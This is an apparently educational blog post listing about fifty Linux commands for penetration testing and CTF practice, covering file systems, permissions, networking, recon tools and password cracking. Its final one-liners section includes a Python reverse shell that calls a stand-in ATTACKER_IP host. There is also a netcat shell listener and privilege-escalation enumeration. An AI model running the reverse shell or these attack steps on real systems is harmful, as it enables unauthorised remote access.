---
title: "Linux Command Line for Hackers: 50 Commands You Need to Know"
description: "Master the Linux command line for cybersecurity and ethical hacking. 50 essential commands covering file systems, networking, process management, permissions, and recon tools."
date: 2026-05-08T10:00:00-04:00
tags: ["linux", "cybersecurity", "hacking", "command line", "terminal"]
categories: ["Cybersecurity", "Programming"]
draft: false
slug: "linux-command-line-for-hackers"
seoKeywords:
  - Linux command line for hackers
  - essential Linux commands cybersecurity
  - Kali Linux terminal commands
  - Linux commands for penetration testing
  - ethical hacking Linux commands
  - Linux networking commands hacker
  - learn Linux for security
canonicalUrl: "https://missquibble.com/posts/linux-command-line-for-hackers/"
---

## Table of Contents
- [Why Linux Matters in Security](#why-linux-matters-in-security)
- [Navigation and File System](#navigation-and-file-system)
- [File Permissions and Ownership](#file-permissions-and-ownership)
- [Networking Commands](#networking-commands)
- [Process and System Monitoring](#process-and-system-monitoring)
- [Text Processing and Search](#text-processing-and-search)
- [Recon and Enumeration Tools](#recon-and-enumeration-tools)
- [Useful One-Liners for CTF and Pentesting](#useful-one-liners-for-ctf-and-pentesting)

## Why Linux Matters in Security

If you want to work in cybersecurity — as a penetration tester, security engineer, incident responder, or CTF player — Linux is not optional. Nearly every serious security tool runs on Linux first. Metasploit, Burp Suite, Nmap, Wireshark, Hashcat, John the Ripper, Volatility — they all live in the terminal.

Kali Linux and Parrot OS are the two dominant security-focused distributions. Both are Debian-based, which means everything in this guide applies directly. More importantly, understanding the terminal makes you dangerous: you stop clicking through GUIs and start scripting, automating, and understanding what tools actually do under the hood.

This guide covers 50 commands organised by category. Bookmark it. You will come back to it.

---

## Navigation and File System

These are your daily drivers — you will use them hundreds of times per session.

```bash
# Print current working directory
pwd

# List files (long format, hidden files, human-readable sizes)
ls -lah

# Change directory
cd /etc
cd ~          # home directory
cd -          # previous directory

# Create a directory (including parent dirs)
mkdir -p /tmp/lab/tools

# Remove files and directories
rm file.txt
rm -rf /tmp/lab    # recursive force — be careful

# Copy and move
cp file.txt /tmp/backup.txt
mv oldname.txt newname.txt

# Create an empty file / update timestamp
touch notes.txt

# Find files by name, type, or size
find / -name "*.conf" 2>/dev/null
find /home -type f -size +10M
find / -perm -4000 2>/dev/null   # find SUID binaries — gold for privesc

# Show disk usage
df -h           # disk free (all mounts)
du -sh /var/*   # size of each item in /var

# Read files
cat /etc/passwd
less /var/log/auth.log    # paginated — use q to quit
head -20 file.txt         # first 20 lines
tail -f /var/log/syslog   # follow live log output
```

---

## File Permissions and Ownership

Understanding permissions is critical for privilege escalation and hardening.

```bash
# Show permissions
ls -la

# Permission breakdown: -rwxr-xr--
# Position 1    : file type (- file, d directory, l link)
# Positions 2-4 : owner permissions (rwx = read write execute)
# Positions 5-7 : group permissions
# Positions 8-10: others permissions

# Change permissions (chmod)
chmod 755 script.sh     # owner: rwx, group: r-x, others: r-x
chmod +x script.sh      # add execute for everyone
chmod 600 private.key   # owner: rw, nobody else

# Change ownership
chown root:root file.txt
chown user:group file.txt

# Find files writable by everyone (misconfiguration hunting)
find / -writable -type f 2>/dev/null | grep -v proc

# Find files owned by a specific user
find / -user www-data 2>/dev/null

# SUID/SGID binaries — common privesc vectors
find / -perm -u=s -type f 2>/dev/null   # SUID
find / -perm -g=s -type f 2>/dev/null   # SGID
```

---

## Networking Commands

Networking commands are essential for recon, pivoting, and understanding your environment.

```bash
# Show network interfaces and IP addresses
ip a
ifconfig    # older systems

# Show routing table
ip route
route -n

# DNS lookup
nslookup example.com
dig example.com
dig example.com MX        # mail records
dig example.com ANY       # all records
host example.com

# Check connectivity
ping -c 4 8.8.8.8
traceroute example.com
mtr example.com           # real-time traceroute

# Active connections and listening ports
ss -tulnp                 # modern replacement for netstat
netstat -tulnp            # older systems
ss -s                     # summary stats

# Download files
wget https://example.com/file.zip
curl -O https://example.com/file.zip
curl -I https://example.com          # headers only
curl -X POST -d '{"key":"val"}' -H 'Content-Type: application/json' https://api.example.com

# Simple port check
nc -zv 192.168.1.1 80         # check if port 80 is open
nc -lvnp 4444                 # listen on port 4444 (reverse shell listener)

# SSH
ssh user@192.168.1.10
ssh -i private_key.pem user@host
ssh -L 8080:localhost:80 user@host   # local port forward
ssh -R 4444:localhost:4444 user@host # remote port forward

# ARP table
arp -a

# Firewall rules
iptables -L -n -v
ufw status verbose
```

---

## Process and System Monitoring

Know what is running — and what should not be.

```bash
# Show running processes
ps aux
ps aux | grep apache    # filter for specific process

# Real-time process viewer
top
htop                    # better version (may need install)

# Process tree
pstree -p

# Kill a process
kill PID
kill -9 PID             # force kill
killall apache2

# Show who is logged in
who
w
last                    # login history
lastb                   # failed login attempts

# System information
uname -a                # kernel version and arch
cat /etc/os-release     # distro info
hostname
id                      # current user and groups
whoami

# Scheduled tasks — check for persistence / privesc
crontab -l              # current user's cron
cat /etc/crontab
ls /etc/cron.*

# Startup services
systemctl list-units --type=service --state=running
service --status-all

# Memory and CPU
free -h
vmstat 1 5              # system stats every 1s, 5 times
lscpu
```

---

## Text Processing and Search

The ability to slice, grep, and transform text is what separates power users from everyone else.

```bash
# Search for a pattern in files
grep "password" /etc/passwd
grep -r "secret" /var/www/         # recursive
grep -i "error" logfile.txt        # case insensitive
grep -v "^#" config.conf           # exclude comment lines
grep -n "TODO" *.py                # show line numbers

# grep with context
grep -A 3 -B 3 "failed login" auth.log   # 3 lines before and after match

# awk — column extraction
awk '{print $1}' file.txt          # print first column
awk -F: '{print $1}' /etc/passwd   # colon delimiter, print usernames

# sed — stream editor / find and replace
sed 's/old/new/g' file.txt         # replace all occurrences
sed -n '10,20p' file.txt           # print lines 10-20
sed '/^$/d' file.txt               # delete blank lines

# Sort and unique
sort file.txt
sort -u file.txt                   # sort + deduplicate
sort -rn file.txt                  # reverse numeric sort

# Count occurrences
sort wordlist.txt | uniq -c | sort -rn

# Cut columns from delimited text
cut -d: -f1 /etc/passwd            # extract usernames
cut -d',' -f2 data.csv

# wc — word/line/character count
wc -l file.txt                     # line count
wc -w file.txt                     # word count

# tr — translate or delete characters
echo "HELLO" | tr '[:upper:]' '[:lower:]'
cat file.txt | tr -d '\r'          # remove Windows line endings

# Base64
echo "missquibble" | base64
echo "bWlzc3F1aWJibGU=" | base64 -d
```

---

## Recon and Enumeration Tools

These are the tools that live in your pentesting toolkit.

```bash
# Nmap — the port scanner
nmap 192.168.1.1                    # basic scan
nmap -sV 192.168.1.1               # service version detection
nmap -O 192.168.1.1                # OS detection
nmap -A 192.168.1.1                # aggressive (version + OS + scripts)
nmap -p 1-65535 192.168.1.1        # all ports
nmap -sU -p 53,67,161 192.168.1.1  # UDP scan
nmap -sn 192.168.1.0/24            # ping sweep (host discovery)
nmap --script=vuln 192.168.1.1     # vulnerability scripts

# Gobuster — directory / DNS brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Nikto — web server scanner
nikto -h http://target.com

# Whois
whois example.com

# theHarvester — OSINT email and subdomain gathering
theHarvester -d example.com -b google

# enum4linux — SMB enumeration
enum4linux -a 192.168.1.10

# Netcat file transfer
# Receiver:
nc -lvnp 9999 > received_file
# Sender:
nc 192.168.1.10 9999 < file_to_send

# Python simple HTTP server (serve current directory)
python3 -m http.server 8080

# Check for open relays / banner grab
nc -nv 192.168.1.10 25
```

---

## Useful One-Liners for CTF and Pentesting

These are commands you will reach for repeatedly during CTF challenges and assessments.

```bash
# Find all SUID binaries (privesc enumeration)
find / -perm -4000 -type f 2>/dev/null

# Find world-writable directories
find / -writable -type d 2>/dev/null

# Check sudo privileges
sudo -l

# Extract all IPs from a file
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' file.txt

# Extract all URLs from a file
grep -oP 'https?://[^\s"]+' file.txt

# Decode a file with xxd (hex dump)
xxd binary_file | head -50

# Strings from a binary
strings binary_file | grep -i password

# Reverse a string
echo "gnirts" | rev

# ROT13 decode
echo "gur cnffjbeq vf" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Generate a wordlist with crunch
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# Hash a password (MD5, SHA256)
echo -n "password123" | md5sum
echo -n "password123" | sha256sum

# Crack a hash with hashcat
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 1800 hash.txt rockyou.txt                       # sha512crypt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Transfer files via SCP
scp file.txt user@192.168.1.10:/tmp/
scp -r /local/dir user@host:/remote/dir

# Quick Python reverse shell (on target)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
```

> **Important reminder:** Only use these tools and techniques on systems you own or have explicit written permission to test. Unauthorised access is illegal and unethical.

---

## Building Your Terminal Muscle Memory

Learning these commands is like learning keyboard shortcuts — the benefit compounds over time. Start by drilling the navigation and networking commands until they are automatic, then layer in the text processing tools.

A few habits that accelerate learning:

- **Use `man`** — `man nmap`, `man grep`, `man sed`. The manual pages are comprehensive and always accurate.
- **Use `--help`** — quicker than man for a reminder of flags.
- **Create aliases** for commands you use constantly: `alias ll='ls -lah'`
- **Write shell scripts** for repetitive tasks. Automation is the terminal's superpower.
- **Practice in a lab** — spin up a local VM, or use TryHackMe/Hack The Box where you can apply these commands against real targets in a legal environment.

The terminal feels unfamiliar at first. After a few weeks it feels slow to use anything else.
